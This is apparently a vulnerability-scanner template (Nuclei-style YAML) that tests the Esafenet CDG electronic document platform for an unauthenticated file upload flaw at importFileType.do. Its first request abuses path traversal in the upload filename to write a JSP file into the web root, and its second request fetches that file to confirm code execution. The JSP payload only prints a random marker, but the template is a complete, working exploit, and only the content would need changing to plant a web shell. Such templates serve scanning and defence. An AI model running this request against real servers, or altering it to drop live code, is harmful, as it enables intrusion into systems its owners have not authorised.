id: poc-yaml-yisaitong-esafenet-importfiletype-file-upload
info:
  name: 亿赛通电子文档平台 importFileType 文件上传漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: file-upload

variables:
  r_filename: "{{rand_text_alphanumeric(5)}}"
  r_boundary: "{{rand_text_alphanumeric(8)}}"
  r_content: "{{rand_text_alphanumeric(10)}}"

flow: http(1) && http(2)

http:
  - id: upload-file
    method: POST
    path:
      - "{{BaseURL}}/CDGServer3/fileType/importFileType.do?flag=syn_user_policy"
    headers:
      Content-Type: "multipart/form-data; boundary=WebKitFormBoundary{{r_boundary}}"
    body: |
      --WebKitFormBoundary{{r_boundary}}\r\nContent-Disposition: form-data; name="fileshare"; filename="/..\\..\\..\\..\\webapps\\ROOT\\{{r_filename}}.jsp"\r\nContent-Type: application/vnd.ms-excel\r\n\r\n<% out.println("{{r_content}}");%>\r\n--WebKitFormBoundary{{r_boundary}}--\r\n\r\n
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"result\":\"xmlFail\""

  - id: verify-upload
    method: GET
    path:
      - "{{BaseURL}}/{{r_filename}}.jsp"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "{{r_content}}"
